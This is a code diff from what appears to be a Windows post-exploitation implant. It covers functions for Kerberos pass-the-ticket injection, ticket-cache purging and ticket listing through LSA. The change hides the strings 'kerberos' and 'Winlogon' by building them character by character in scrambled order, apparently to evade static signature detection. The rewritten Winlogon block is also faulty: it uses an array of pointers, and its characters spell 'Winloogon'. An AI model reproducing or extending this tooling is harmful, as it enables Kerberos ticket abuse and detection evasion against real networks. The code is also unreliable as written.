@@ -170,19 +170,17 @@ NTSTATUS GetLsaHandle( HANDLE hToken, BOOL highIntegrity, PHANDLE hLsa )
         // AuditPol.exe /set /subcategory:"Security System Extension"
         // /success:enable /failure:enable Event ID 4611 Note: detect elevation via
         // winlogon.exe.
-        char* name = "Winlogon";
-        /*
-        char* name[9] = { 0 }; // Winlogon
-        name[ 2 ] =  0x6e;
-        name[ 8 ] =  0x00;
-        name[ 4 ] =  0x6f;
-        name[ 0 ] =  0x57;
-        name[ 1 ] =  0x69;
-        name[ 7 ] =  0x6e;
-        name[ 6 ] =  0x6f;
-        name[ 3 ] =  0x6c;
-        name[ 5 ] =  0x67;
-        */
+        char* name[10] = { 0 }; // Winlogon
+        name[ 2 ] =  'n';
+        name[ 8 ] =  'n';
+        name[ 4 ] =  'o';
+        name[ 0 ] =  'W';
+        name[ 1 ] =  'i';
+        name[ 7 ] =  'o';
+        name[ 6 ] =  'g';
+        name[ 3 ] =  'l';
+        name[ 9 ] =  '\0';
+        name[ 5 ] =  'o';
         STRING lsaString = (STRING){.Length = 8, .MaximumLength = 9, .Buffer = name};
         status = Instance.Win32.LsaRegisterLogonProcess( (PLSA_STRING)&lsaString, &hLsaLocal, &mode );
         if ( ! NT_SUCCESS( status ) || ! hLsaLocal )
@@ -401,7 +399,7 @@ BOOL Ptt( HANDLE hToken, PBYTE Ticket, DWORD TicketSize, LUID luid )
 {
     BOOL                     highIntegrity  = FALSE;
     HANDLE                   hLsa           = NULL;
-    LSA_STRING               krbAuth        = {.Buffer = "kerberos", .Length = 8, .MaximumLength = 9};
+    LSA_STRING               krbAuth        = {.Buffer = NULL, .Length = 8, .MaximumLength = 9};
     NTSTATUS                 status         = STATUS_UNSUCCESSFUL;
     NTSTATUS                 protocolStatus = STATUS_UNSUCCESSFUL;
     ULONG                    authPackage    = 0;
@@ -409,6 +407,19 @@ BOOL Ptt( HANDLE hToken, PBYTE Ticket, DWORD TicketSize, LUID luid )
     DWORD                    submitSize     = sizeof( KERB_SUBMIT_TKT_REQUEST ) + TicketSize;
     PVOID                    response       = NULL;
     ULONG                    responseSize   = 0;
+    CHAR                     name[9]        = { 0 };
+
+    name[5] = 'r';
+    name[0] = 'k';
+    name[8] = '\0';
+    name[1] = 'e';
+    name[2] = 'r';
+    name[7] = 's';
+    name[3] = 'b';
+    name[6] = 'o';
+    name[4] = 'e';
+
+    krbAuth.Buffer = name;
 
     if ( ! hToken )
         return FALSE;
@@ -481,13 +492,26 @@ BOOL Purge( HANDLE hToken, LUID luid )
 {
     BOOL                         highIntegrity  = FALSE;
     HANDLE                       hLsa           = NULL;
-    LSA_STRING                   krbAuth        = {.Buffer = "kerberos", .Length = 8, .MaximumLength = 9};
+    LSA_STRING                   krbAuth        = {.Buffer = NULL, .Length = 8, .MaximumLength = 9};
     NTSTATUS                     status         = STATUS_UNSUCCESSFUL;
     NTSTATUS                     protocolStatus = STATUS_UNSUCCESSFUL;
     KERB_PURGE_TKT_CACHE_REQUEST purgeRequest   = { 0 };
     ULONG                        authPackage    = 0;
     PVOID                        purgeResponse  = NULL;
     ULONG                        responseSize   = 0;
+    CHAR                         name[9]        = { 0 };
+
+    name[5] = 'r';
+    name[0] = 'k';
+    name[8] = '\0';
+    name[1] = 'e';
+    name[2] = 'r';
+    name[7] = 's';
+    name[3] = 'b';
+    name[6] = 'o';
+    name[4] = 'e';
+
+    krbAuth.Buffer = name;
 
     if ( ! hToken )
         return FALSE;
@@ -555,7 +579,7 @@ PSESSION_INFORMATION Klist( HANDLE hToken, LUID luid )
     BOOL                              highIntegrity  = FALSE;
     HANDLE                            hLsa           = NULL;
     ULONG                             authPackage    = 0;
-    LSA_STRING                        krbAuth        = {.Buffer = "kerberos", .Length = 8, .MaximumLength = 9};
+    LSA_STRING                        krbAuth        = {.Buffer = NULL, .Length = 8, .MaximumLength = 9};
     PLOGON_SESSION_DATA               sessionData    = NULL;
     KERB_QUERY_TKT_CACHE_REQUEST      cacheRequest   = { 0 };
     PKERB_QUERY_TKT_CACHE_EX_RESPONSE cacheResponse  = NULL;
@@ -567,6 +591,19 @@ PSESSION_INFORMATION Klist( HANDLE hToken, LUID luid )
     PSESSION_INFORMATION              TmpSession     = NULL;
     PTICKET_INFORMATION               TicketInfo     = NULL;
     PTICKET_INFORMATION               TmpTicketInfo  = NULL;
+    CHAR                              name[9]        = { 0 };
+
+    name[5] = 'r';
+    name[0] = 'k';
+    name[8] = '\0';
+    name[1] = 'e';
+    name[2] = 'r';
+    name[7] = 's';
+    name[3] = 'b';
+    name[6] = 'o';
+    name[4] = 'e';
+
+    krbAuth.Buffer = name;
 
     if ( ! hToken )
         return NULL;
